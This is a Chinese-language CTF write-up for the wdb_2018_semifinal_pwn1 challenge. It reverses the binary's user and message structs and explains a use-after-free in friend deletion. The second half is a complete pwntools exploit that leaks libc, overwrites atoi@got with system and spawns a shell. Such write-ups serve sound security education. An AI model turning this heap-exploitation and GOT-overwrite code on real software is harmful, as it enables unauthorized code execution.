# wdb_2018_semifinal_pwn1

## 总结
其实就是很简单的UAF的题目，只是结构体和分支比较复杂一点，所以逆向难度增加了。利用其实很简单。

## 题目分析

### checksec
```
# checksec ./data/wdb_2018_semifinal_pwn1
[*] '/root/xxx/data/wdb_2018_semifinal_pwn1'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

远程环境为libc-2.23-so。

### 结构体
主要涉及到两个结构体。一个是玩家信息的结构体：

```c
struct __attribute__((aligned(8))) User
{
  char *name;
  uint64_t age;
  char descripe[256];
  Message *msg_ptr;
  User *friend;
  uint64_t status;
};
```

一个是消息的结构体：

```c
struct Message
{
  char *title;
  char *content;
  char *next_message;
};
```

### 漏洞点

在manager_friend的分支，可以删除任意用户。但是删除该用户后，还能用该用户登录。

```c
unsigned __int64 __fastcall manage_friend(int cur_id, __int64 a2)
{
  char *friend_name;
  int v4;
  User *cur_friend;
  User *friend_flaga;
  User *friend2;
  char buf;
  unsigned __int64 v9;

  v9 = __readfsqword(0x28u)
  printf("So..Do u want to add or delete this friend?(a/d)", a2);
  read(0, &buf, 2uLL);
  if ( buf == 'd' )
  {
    cur_friend = user_array[cur_id]->friend;
    if ( !cur_friend )
      puts("What the fuck?");
    while ( cur_friend && strcmp(friend_name, cur_friend->name) )
      cur_friend = cur_friend->friend;
    if ( cur_friend )
    {
      friend2 = user_array[cur_id]->friend;
      if ( friend2->friend )
      {
        while ( strcmp(friend2->friend->name, friend_name) )
          friend2 = friend2->friend;
        friend2->friend = cur_friend->friend;
        free(cur_friend)
      }
      else
      {
        user_array[cur_id]->friend = 0LL;
        free(friend2);
      }
    }
    else
    {
      puts("You don't have such a friend!");
```

## 利用思路

- 注册两个用户user1和user2
- user1登录，然后添加user2为朋友，然后删除user2这个朋友
- 注册0x401816的用户，这样user2的名字就成了Done!，并且可以登录
- 登录user2，查看profile即可泄露出main_arena+88的地址
- 然后登录0x401816用户，修改username为atoi@got
- 再登录atoi_addr用户，然后update，修改atoi@got为system地址，再输入/bin/sh即可拿到shell

## Exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def register(name_size:int, name:(str, bytes), age:int, desc:(str, bytes)="a"):
    p.sendlineafter("Your choice:", "2")
    p.sendlineafter("Input your name size:", str(name_size))
    p.sendafter("Input your name:", name)
    p.sendlineafter("Input your age:", str(age))
    if age > 17:
        p.sendafter("Input your description:", desc)


def login(user_name:(str, bytes)):
    p.sendlineafter("Your choice:", "1")
    p.sendafter("Please input your user name:", user_name)
    msg = p.recvline()
    info("Msg recv: {}".format(msg))
    return msg


def view_profile():
    p.sendlineafter("Your choice:", "1")
    msg = p.recvlines(3)
    info("Msg recv: {}".format(msg))
    return msg


def update_profile(user_name:(str, bytes), age:int, desc:(str, bytes)):
    p.sendlineafter("Your choice:", "2")
    p.sendafter("Input your name:", user_name)
    p.sendlineafter("Input your age:", str(age))
    p.sendafter("Input your description:", desc)


def add_delete_friend(add_delete:str, friend_name:(str, bytes)):
    p.sendlineafter("Your choice:", "3")
    p.sendafter("Input the friend's name:", friend_name)
    p.sendlineafter("So..Do u want to add or delete this friend?(a/d)", add_delete)


def send_message(friend_name:(str, bytes), title:(str, bytes), content:(str, bytes)):
    p.sendlineafter("Your choice:", "4")
    p.sendafter("Which user do you want to send a msg to:", friend_name)
    p.sendafter("Input your message title:", title)
    p.sendafter("Input your content:", content)


def view_message():
    p.sendlineafter("Your choice:", "5")
    msg = p.recvuntil("1.view profile\n")
    info("Msg recv: {}".format(msg))
    return msg

def logout():
    p.sendlineafter("Your choice:", "6")


register(0x10, "user1", 16)
register(0x10, "user2", 16)


login("user1\x00")
add_delete_friend('a', "user2\x00")

add_delete_friend('d', "user2\x00")

logout()
register(0x128, p64(0x401816), 16)

# stop()
login("Done!" + "\x00")
_, leak_addr, _1 = view_profile()

libc_base_addr = int16(leak_addr[4:].decode()) - 0x3c4b78
log_address("libc_base_addr", libc_base_addr)

logout()

login(p64(0x401816))
update_profile(p64(0x602060), 123, "deadbeef")
logout()

login(p64(libc_base_addr + libc.sym['atoi']))

p.sendlineafter("Your choice:", "2")
p.sendafter("Input your name:", p64(libc_base_addr + libc.sym['system']))
p.sendafter("Input your description:", "/bin/sh\x00")
p.sendline("/bin/sh\x00")

p.interactive()
```